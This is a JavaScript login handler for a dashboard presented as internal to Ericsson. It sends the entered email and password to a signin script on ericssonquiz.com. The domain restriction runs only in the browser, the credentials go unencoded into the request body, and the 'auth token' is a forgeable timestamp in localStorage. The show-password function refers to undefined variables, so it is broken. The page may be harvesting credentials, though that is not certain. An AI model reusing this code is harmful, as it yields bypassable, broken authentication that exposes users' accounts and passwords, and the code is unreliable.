function processForm(e) {
    if (e.preventDefault) e.preventDefault();
    var suffix ="@ericsson.com"
    if(document.getElementById("username").value.substr(-suffix.length) === suffix)
    {
        httpPostAsync()
    }else{
        document.getElementById("error").innerHTML="<div class='error' >This dashboard is internal, access is forbidding outside Ericsson domain </div>"
    }
    /* do what you want with the form */
    // You must return false to prevent the default form behavior
    return false;
}
function showPassword(){
    "password" === document.getElementById("password").type ? (document.getElementById("password").type = "text", t.classList.remove("icon-eye"), t.classList.add("icon-eye-solid"), e.innerText = "Hide password") : (document.getElementById("password").type = "password", t.classList.remove("icon-eye-solid"), t.classList.add("icon-eye"), e.innerText = "Show password")
}
var form = document.getElementById('auth');
if (form.attachEvent) {
    form.attachEvent("submit", processForm);
} else {
    form.addEventListener("submit", processForm);
}


async function httpPostAsync(){
  var http = new XMLHttpRequest();
    var url = 'https://ericssonquiz.com/IMK/Tests/signin.php';
    var params = 'Email='+document.getElementById("username").value+'&Password='+document.getElementById("password").value;
    http.open('POST', url, true);
    
    //Send the proper header information along with the request
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    
    http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState == 4 && http.status == 200) {
            const json = http.responseText;
            const obj = JSON.parse(json);
            if(obj.success){
                if(document.getElementById("password").value=='12345678') {
                    alert("It Looks like you're using a weak password!</br> Please press okay to change it ")
                    window.location.replace("https://ericssonquiz.com/dashboard/reset-password.html");
                } else {
                    localStorage['authToken']=new Date().getTime();
                    localStorage['Email']= document.getElementById("username").value;
                    window.location.replace("https://ericssonquiz.com/dashboard/");
                }
            }else{
                document.getElementById("error").innerHTML="<div class='error' >Invalid username and/or password.</div>"
            }
        }
    }
    http.send(params);
};
